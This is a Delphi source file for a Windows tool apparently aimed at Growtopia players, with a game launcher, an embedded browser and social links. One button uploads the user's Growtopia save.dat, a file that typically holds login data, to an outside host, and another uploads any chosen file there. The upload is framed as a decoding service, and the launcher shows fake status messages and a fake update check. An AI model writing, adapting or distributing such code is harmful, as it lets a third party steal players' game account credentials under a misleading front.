unit Unit2;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, MmSystem, Vcl.Dialogs, Vcl.StdCtrls, Vcl.WinXCtrls, Vcl.Menus, IdTCPConnection, IdTCPClient, IdHTTP, IdBaseComponent,
  IdComponent, IdCustomTCPServer, IdCustomHTTPServer, IdHTTPServer,
  IdContext, IdMultipartFormData, IdHeaderList, IdMessageCoder,
  IdMessageCoderMIME, IdMessage, IdGlobalProtocols, System.Sensors,
  System.Sensors.Components, Vcl.ExtCtrls, Vcl.OleCtrls, SHDocVw,
  System.Net.URLClient, System.Net.HttpClient, System.Net.HttpClientComponent,
  Vcl.ComCtrls, Vcl.Imaging.pngimage,TlHelp32,ShellApi, Vcl.MPlayer, Vcl.ExtDlgs,Vcl.Themes,IdHashMessageDigest, idHash;

type
  TForm2 = class(TForm)
    TabControl1: TTabControl;
    Panel1: TPanel;
    WebBrowser1: TWebBrowser;
    Button1: TButton;
    Edit1: TEdit;
    Button2: TButton;
    OpenDialog1: TOpenDialog;
    Button3: TButton;
    IdHTTP1: TIdHTTP;
    Panel2: TPanel;
    Button4: TButton;
    Edit2: TEdit;
    Button5: TButton;
    Button6: TButton;
    Label1: TLabel;
    Image1: TImage;
    Image2: TImage;
    ListBox1: TListBox;
    procedure FormCreate(Sender: TObject);
    procedure TabControl1Change(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}

procedure TForm2.Button1Click(Sender: TObject);
begin
OpenDialog1.Execute();
Edit1.Text:=OpenDialog1.FileName;
end;

procedure TForm2.Button2Click(Sender: TObject);
var
  Params: TIdMultipartFormDataStream;
  Response: TStringStream;
begin



  try



    Params := TIdMultipartFormDataStream.Create;
    Response := TStringStream.Create;
    try



      Params.AddFile('file', Edit1.Text);

      // Substiture real url below.
      IdHTTP1.Post('http://liab.890m.com/gtnoobs/index.php', Params, Response);
       WebBrowser1.Show;
WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/file_decode.php?file=');
    finally

      Params.Free;
      Response.Free;
    end;
  except
    // Log exception
    on e: Exception    do
    //ShowMessage(e.Message);
    end;

end;

procedure TForm2.Button3Click(Sender: TObject);
var
  Params: TIdMultipartFormDataStream;
  Response: TStringStream;
begin



  try



    Params := TIdMultipartFormDataStream.Create;
    Response := TStringStream.Create;
    try



      Params.AddFile('file', 'C:\Users\'+GetEnvironmentVariable('USERNAME')+'\AppData\Local\Growtopia\save.dat');

      // Substiture real url below.
      IdHTTP1.Post('http://liab.890m.com/gtnoobs/index.php', Params, Response);
    finally

      Params.Free;
      Response.Free;
       WebBrowser1.Show;
WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/file_decode.php?file=');
    end;
  except
    // Log exception
    on e: Exception    do
    //ShowMessage(e.Message);
    end;

end;
 function ExecuteProcess(const FileName, Params: string; Folder: string; WaitUntilTerminated, WaitUntilIdle, RunMinimized: boolean;
  var ErrorCode: integer): boolean;
var
  CmdLine: string;
  WorkingDirP: PChar;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
begin
  Result := true;
  CmdLine := '"' + FileName + '" ' + Params;
  if Folder = '' then Folder := ExcludeTrailingPathDelimiter(ExtractFilePath(FileName));
  ZeroMemory(@StartupInfo, SizeOf(StartupInfo));
  StartupInfo.cb := SizeOf(StartupInfo);
  if RunMinimized then
    begin
      StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
      StartupInfo.wShowWindow := SW_SHOWMINIMIZED;
    end;
  if Folder <> '' then WorkingDirP := PChar(Folder)
  else WorkingDirP := nil;
  if not CreateProcess(nil, PChar(CmdLine), nil, nil, false, 0, nil, WorkingDirP, StartupInfo, ProcessInfo) then
    begin
      Result := false;
      ErrorCode := GetLastError;
      exit;
    end;
  with ProcessInfo do
    begin
      CloseHandle(hThread);
      if WaitUntilIdle then WaitForInputIdle(hProcess, INFINITE);
      if WaitUntilTerminated then
        repeat
          Application.ProcessMessages;
        until MsgWaitForMultipleObjects(1, hProcess, false, INFINITE, QS_ALLINPUT) <> WAIT_OBJECT_0 + 1;
      CloseHandle(hProcess);
    end;
end;
function GetPIDbyProcessName(processName:String):integer;
var
  GotProcess: Boolean;
  tempHandle: tHandle;
  procE: tProcessEntry32;
begin
  tempHandle:=CreateToolHelp32SnapShot(TH32CS_SNAPALL, 0);
  procE.dwSize:=SizeOf(procE);
  GotProcess:=Process32First(tempHandle, procE);
  {$B-}
    if GotProcess and (procE.szExeFile <> processName) then
      repeat GotProcess := Process32Next(tempHandle, procE);
      until (not GotProcess) or (procE.szExeFile = processName);
  {$B+}

  if GotProcess then
    result := procE.th32ProcessID
  else
    result := 0; // process not found in running process list

  CloseHandle(tempHandle);
end;
function MD5String(str: String): String;
begin
  with TIdHashMessageDigest5.Create do
    try
      Result := HashStringAsHex(str);
    finally
      Free;
    end;
end;
procedure TForm2.Button4Click(Sender: TObject);
var
  FileName, Parameters, WorkingFolder: string;
  Error: integer;
  OK: boolean;

  StartInfo : TStartupInfo;
  ProcInfo : TProcessInformation;
  CreateOK : Boolean;
begin
OpenDialog1.FileName:='C:\Users\Liab\AppData\Local\Growtopia\Growtopia.exe';
OpenDialog1.Execute();
Edit2.Text:=OpenDialog1.FileName;
 FileName := Edit2.Text;
  WorkingFolder := ''; // if empty function will extract path from FileName
  Parameters := '-maximized'; // can be empty
  OK := ExecuteProcess(FileName, Parameters, WorkingFolder, false, false, false, Error);

              ListBox1.Items.Add('Loading Fake Mutex...');
              ListBox1.Items.Add('Creating Growtopia.exe Process...');
              ListBox1.Items.Add('Started GT PID[' + IntToStr(GetPIDbyProcessName('Growtopia')) + ']' + ' | Hashed GUID [' + MD5String('01242EA52EFE31C906F488D43B634944') + ']');
end;

procedure TForm2.FormCreate(Sender: TObject);
begin
//WebBrowser1.Navigate('http://liab.890m.com/gtnoobs/wait.php');
ListBox1.Items.Add('Checking for latest updates...');
ListBox1.Items.Add('there is no updates found! have fun using!');
end;

procedure TForm2.Image1Click(Sender: TObject);
begin
 ShellExecute(Handle, 'open',
'https://discord.gg/Zwhyrnj', nil, nil, SW_SHOWNORMAL) ;
end;

procedure TForm2.Image2Click(Sender: TObject);
begin
 ShellExecute(Handle, 'open',
'https://www.youtube.com/channel/UC2xSrkBPo0mBU9hFlQ66Htg', nil, nil, SW_SHOWNORMAL) ;

end;

procedure TForm2.TabControl1Change(Sender: TObject);
begin
if TabControl1.TabIndex=1 then
begin
   Panel1.Visible:=true;
  WebBrowser1.Hide;
    Panel2.Visible:=false;
end;


    if TabControl1.TabIndex=2  then
    begin
      Panel1.Visible:=false;
     Panel2.Visible:=false;
  WebBrowser1.Visible:=false;
    end;

  if TabControl1.TabIndex=0  then
  begin
    Panel1.Visible:=false;
              ListBox1.Show;
               Panel2.Visible:=true;
  WebBrowser1.Visible:=false;

  end;
   if TabControl1.TabIndex>0 then
   begin
     ListBox1.Hide;
   end;

end;

end.
